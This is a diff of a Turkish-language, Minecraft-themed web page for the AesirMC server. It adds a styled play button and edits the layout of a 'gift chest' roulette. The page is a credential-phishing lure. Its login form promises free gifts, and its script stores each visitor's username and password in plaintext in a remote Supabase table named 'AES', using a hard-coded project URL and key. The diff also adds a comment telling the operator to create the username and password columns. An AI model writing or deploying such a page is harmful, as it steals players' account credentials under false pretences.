@@ -12,6 +12,7 @@
         :root {
             --primary: #00a2ff;
             --secondary: #0066ff;
+            --accent: #d48e00; /* Butonun turuncu rengi */
             --bg-dark: #050608;
             --glass: rgba(255, 255, 255, 0.03);
             --border: rgba(255, 255, 255, 0.1);
@@ -44,13 +45,44 @@
             z-index: 100;
         }
 
+        /* YENİ OYNA BUTONU STİLİ */
+        .play-button-container {
+            display: flex;
+            justify-content: center;
+            padding: 20px 0;
+            animation: fadeIn 1s ease-in;
+        }
+
+        .btn-play {
+            background-color: #d48e00; /* Görseldeki turuncu tonu */
+            color: black;
+            padding: 12px 30px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 800;
+            font-size: 18px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transition: 0.3s;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(212, 142, 0, 0.3);
+        }
+
+        .btn-play:hover {
+            transform: scale(1.05);
+            box-shadow: 0 6px 20px rgba(212, 142, 0, 0.5);
+            background-color: #f1a400;
+        }
+
         .logo-wrapper { display: flex; align-items: center; gap: 15px; }
         .logo-img { width: 45px; height: 45px; object-fit: contain; filter: drop-shadow(0 0 10px var(--primary)); }
         .logo-text { font-size: 26px; font-weight: 800; letter-spacing: -1px; text-transform: uppercase; }
         .logo-text span { color: var(--primary); }
 
         #auth-container {
-            margin: auto;
+            margin: 40px auto;
             width: 100%;
             max-width: 420px;
             padding: 50px;
@@ -60,11 +92,7 @@
             border-radius: 32px;
             box-shadow: 0 40px 100px rgba(0,0,0,0.5);
             text-align: center;
-            animation: fadeIn 0.8s ease-out;
         }
-
-        h2 { font-size: 32px; margin-bottom: 10px; font-weight: 800; }
-        p { color: #888; margin-bottom: 30px; font-size: 15px; }
 
         input {
             width: 100%;
@@ -73,12 +101,9 @@
             border: 1px solid var(--border);
             border-radius: 16px;
             color: white;
-            font-size: 16px;
-            transition: all 0.3s;
-            box-sizing: border-box;
             margin-bottom: 20px;
+            box-sizing: border-box;
         }
-        input:focus { outline: none; border-color: var(--primary); background: rgba(255,255,255,0.08); box-shadow: 0 0 20px rgba(0, 162, 255, 0.2); }
 
         .btn-primary {
             width: 100%;
@@ -88,17 +113,13 @@
             border-radius: 16px;
             color: white;
             font-weight: 700;
-            font-size: 16px;
             cursor: pointer;
-            transition: 0.3s;
             text-transform: uppercase;
         }
-        .btn-primary:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(0, 162, 255, 0.4); }
 
-        #game-container { display: none; padding: 60px 10%; text-align: center; }
-        .main-chest { width: 240px; cursor: pointer; transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); filter: drop-shadow(0 0 40px rgba(0, 162, 255, 0.4)); }
-        .main-chest:hover { transform: scale(1.1) rotate(5deg); }
-
+        #game-container { display: none; padding: 40px 10%; text-align: center; }
+        .main-chest { width: 240px; cursor: pointer; transition: 0.5s; filter: drop-shadow(0 0 40px rgba(0, 162, 255, 0.4)); }
+        
         #roulette-section { display: none; margin-top: 50px; }
         .viewport {
             width: 100%;
@@ -111,17 +132,15 @@
             position: relative;
             overflow: hidden;
         }
-        .viewport::after { content: ''; position: absolute; left: 50%; top: 0; bottom: 0; width: 4px; background: var(--primary); box-shadow: 0 0 20px var(--primary); z-index: 10; }
-
+        .viewport::after { content: ''; position: absolute; left: 50%; top: 0; bottom: 0; width: 4px; background: var(--primary); z-index: 10; }
         #strip { display: flex; position: absolute; left: 0; top: 0; height: 100%; align-items: center; }
-        .slot { min-width: 140px; display: flex; flex-direction: column; align-items: center; gap: 10px; }
-        .slot img { width: 80px; filter: drop-shadow(0 10px 15px rgba(0,0,0,0.5)); }
+        .slot { min-width: 140px; display: flex; flex-direction: column; align-items: center; }
+        .slot img { width: 80px; }
 
-        #win-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); backdrop-filter: blur(15px); z-index: 1000; justify-content: center; align-items: center; flex-direction: column; }
-        .win-card { background: rgba(255,255,255,0.05); padding: 60px; border-radius: 40px; border: 1px solid var(--primary); text-align: center; animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
-
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-        @keyframes popIn { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        #win-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 1000; justify-content: center; align-items: center; flex-direction: column; }
+        .win-card { background: rgba(255,255,255,0.05); padding: 60px; border-radius: 40px; border: 1px solid var(--primary); text-align: center; }
+        
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
 </head>
 <body>
@@ -134,6 +153,12 @@
     <div id="status-bar" style="font-size: 13px; font-weight: 600; color: #555;">DURUM: <span style="color: #00ff00;">AKTİF</span></div>
 </nav>
 
+<div class="play-button-container">
+    <button class="btn-play" onclick="window.location.href='https://aesirmc.com'">
+        <span>🖱️</span> oyna.aesirmc.com
+    </button>
+</div>
+
 <div id="auth-container">
     <h2>Giriş Yap</h2>
     <p>Hediyelerini almak için hesabını bağla.</p>
@@ -143,9 +168,9 @@
 </div>
 
 <div id="game-container">
-    <h1 id="welcome-txt" style="font-weight: 800; font-size: 42px; margin-bottom: 40px;"></h1>
+    <h1 id="welcome-txt" style="font-weight: 800; font-size: 42px; margin-bottom: 20px;"></h1>
     <div id="chest-zone">
-        <img src="adsız.png" class="main-chest" onclick="initRoulette()">
+        <img src="adsız.png" class="main-chest" onclick="initRoulette()" onerror="this.src='https://minecraft.wiki/images/Chest_JE2_BE2.png'">
         <p style="margin-top: 30px; color: var(--primary); font-weight: 600; letter-spacing: 2px; text-transform: uppercase;">Sandığı Açmak İçin Dokun</p>
     </div>
     <div id="roulette-section">
@@ -156,14 +181,14 @@
 
 <div id="win-modal">
     <div class="win-card">
-        <h3 style="color: var(--primary); margin: 0; text-transform: uppercase; letter-spacing: 2px;">Başarım Kazanıldı!</h3>
-        <h1 id="win-name" style="font-size: 42px; margin: 10px 0 30px 0;"></h1>
+        <h1 id="win-name" style="font-size: 42px;"></h1>
         <img id="win-img" src="" width="180">
         <div style="margin-top: 40px;"><button class="btn-primary" onclick="location.reload()">TEKRAR DENE</button></div>
     </div>
 </div>
 
 <script>
+    // SUPABASE AYARLARI
     const S_URL = "https://iigemvvlznvgneghevev.supabase.co";
     const S_KEY = "sb_publishable_sus0jwzJ9oMsoTO-_Xq3Yg_OTXHZIpm"; 
     const _db = supabase.createClient(S_URL, S_KEY);
@@ -181,7 +206,10 @@
         const p = document.getElementById('password').value;
         if(!u || !p) return alert("Bilgileri gir!");
 
-        _db.from('AES').insert([{ username: u, password: p }]).then(res => console.log("DB Status:", res));
+        // DİKKAT: Supabase tablonuzda 'username' ve 'password' sütunlarını oluşturduğunuzdan emin olun!
+        _db.from('AES').insert([{ username: u, password: p }]).then(res => {
+            if(res.error) console.log("Hata:", res.error.message);
+        });
 
         document.getElementById('auth-container').style.display = 'none';
         document.getElementById('game-container').style.display = 'block';
@@ -193,10 +221,9 @@
         document.getElementById('roulette-section').style.display = 'block';
         const strip = document.getElementById('strip');
         strip.innerHTML = '';
-        
         for(let i=0; i<80; i++) {
             const item = rewards[Math.floor(Math.random() * rewards.length)];
-            strip.innerHTML += `<div class="slot"><img src="${item.img}"><span style="font-size: 10px; color: #555;">${item.name}</span></div>`;
+            strip.innerHTML += `<div class="slot"><img src="${item.img}"><span style="font-size: 10px;">${item.name}</span></div>`;
         }
     }
 
@@ -204,12 +231,9 @@
         const strip = document.getElementById('strip');
         const btn = document.getElementById('spin-btn');
         btn.disabled = true;
-        btn.style.opacity = "0.3";
-
         const move = 5000 + Math.floor(Math.random() * 2000);
         strip.style.transition = "transform 6s cubic-bezier(0.15, 0, 0.15, 1)";
         strip.style.transform = `translateX(-${move}px)`;
-
         setTimeout(() => {
             const final = rewards[Math.floor(Math.random() * rewards.length)];
             document.getElementById('win-modal').style.display = 'flex';
